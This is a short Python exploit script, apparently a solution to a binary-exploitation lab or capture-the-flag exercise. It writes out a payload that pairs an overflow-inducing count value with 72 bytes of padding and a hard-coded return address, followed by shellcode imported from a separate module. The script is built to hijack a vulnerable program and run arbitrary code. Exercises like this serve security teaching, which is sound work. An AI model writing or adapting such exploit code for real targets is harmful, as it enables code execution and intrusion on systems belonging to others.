#!/usr/bin/env python3

import sys

from shellcode import shellcode
count = (0x4000000000000001).to_bytes(8, byteorder="little")
payload = count + b"A" * 72 + (0x7ffffff6d3d0).to_bytes(8, byteorder="little") + shellcode
sys.stdout.buffer.write(payload)
